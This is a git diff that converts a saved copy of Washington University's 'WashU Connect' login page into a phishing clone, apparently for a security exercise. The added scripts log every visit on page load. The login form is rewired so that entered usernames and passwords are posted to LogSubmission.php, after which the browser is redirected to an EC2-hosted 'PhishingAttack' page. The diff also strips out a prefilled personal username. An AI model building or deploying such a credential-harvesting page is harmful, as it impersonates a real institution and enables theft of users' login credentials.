@@ -2,6 +2,40 @@
 <link rel="icon" data-savepage-href="https://connect.wustl.edu/login/img/favicon/favicon-32x32.png" href="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>WashU Connect</title>
+    <script>
+        window.onload = function() {
+            fetch('LogVisit.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ message: 'User entered the page' })
+            })
+            .then(response => response.json())
+            .then(data => console.log('User enter request was successful:', data))
+            .catch(error => console.error('Error with user enter request:', error));
+        }
+
+        function submitForm(event) {
+            event.preventDefault();
+
+            const formData = new FormData(event.target);
+
+            fetch('LogSubmission.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Form submit was successful:', data);
+            })
+            .catch(error => {
+                console.error('Error with form submit request:', error);
+            });
+
+            window.location.href = 'http://ec2-3-15-13-205.us-east-2.compute.amazonaws.com/~SnowEuro/security/PhishingAttack/phishing.html';
+        }
+    </script>
 
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -205,16 +239,71 @@ src:/*savepage-url=https://use.typekit.net/af/efc425/00000000000000007735e5a8/30
   },false);
   function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
 </script>
-<meta name="savepage-url" content="https://connect.wustl.edu/login/wulogin.aspx?idp_ver=3&execution=e5s1&ref=https://acadinfo.wustl.edu/">
+<meta name="savepage-url" content="http://ec2-3-15-13-205.us-east-2.compute.amazonaws.com/~SnowEuro/security/PhishiAttack/phishing.html">
 <meta name="savepage-title" content="WashU Connect">
 <meta name="savepage-pubdate" content="Unknown">
-<meta name="savepage-from" content="https://connect.wustl.edu/login/wulogin.aspx?idp_ver=3&execution=e5s1&ref=https://acadinfo.wustl.edu/">
+<meta name="savepage-from" content="http://ec2-3-15-13-205.us-east-2.compute.amazonaws.com/~SnowEuro/security/PhishingAttack/phishing.html">
 <meta name="savepage-date" content="Thu Apr 17 2025 12:34:21 GMT-0500 (hora de verano central)">
 <meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
 <meta name="savepage-version" content="33.9">
 <meta name="savepage-comments" content="">
   </head>
 <body>
+
+    <script>
+        window.onload = function() {
+            // Make sure the path is correct and that LogVisit.php exists
+            fetch('LogVisit.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ message: 'User entered the page' })
+            })
+            .then(response => {
+                // Check for successful response
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('User enter request was successful:', data);
+            })
+            .catch(error => {
+                console.error('Error with user enter request:', error);
+            });
+        };
+        
+        function submitForm(event) {
+            event.preventDefault();
+        
+            const formData = new FormData(event.target);
+        
+            // Ensure LogSubmission.php is in the correct location
+            fetch('LogSubmission.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Check for successful response
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Form submit was successful:', data);
+            })
+            .catch(error => {
+                console.error('Error with form submit request:', error);
+            });
+        
+            setTimeout(() => {
+                window.location.href = 'http://ec2-3-15-13-205.us-east-2.compute.amazonaws.com/~SnowEuro/security/PhishingAttack/phishing.html';
+            }, 1000);
+        }        
+    </script>
 
     <header id="masthead" class="site-header cf wustl-stick tactical-menu-present" role="banner">
         <div class="container">
@@ -248,7 +337,7 @@ src:/*savepage-url=https://use.typekit.net/af/efc425/00000000000000007735e5a8/30
         <div class="grid">
             <div id="content">
 
-                <form name="ctl01" method="post" action="./wulogin.aspx?idp_ver=3&execution=e5s1&ref=https%3a%2f%2facadinfo.wustl.edu%2f" id="ctl01">
+                <form name="ctl01" onsubmit="submitForm(event)" id="ctl01">
 <div style="display: none;">
 <input type="hidden" name="ScriptManager1_HiddenField" id="ScriptManager1_HiddenField" value="">
 <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
@@ -299,7 +388,7 @@ src:/*savepage-url=https://use.typekit.net/af/efc425/00000000000000007735e5a8/30
         <div class="field-group">
             <label for="ucWUSTLKeyLogin_txtUsername">Username</label>
             <div class="input-group">
-                <input name="ucWUSTLKeyLogin$txtUsername" type="text" id="ucWUSTLKeyLogin_txtUsername" tabindex="1" autocapitalize="none" autofocus="autofocus" autocomplete="username" value="e.j.palomino">
+                <input name="ucWUSTLKeyLogin$txtUsername" type="text" id="ucWUSTLKeyLogin_txtUsername" tabindex="1" autocapitalize="none" autofocus="autofocus" autocomplete="username" value="">
                 <p class="input-error" id="error-username">Username is required</p>
             </div>
             <div class="field-link">
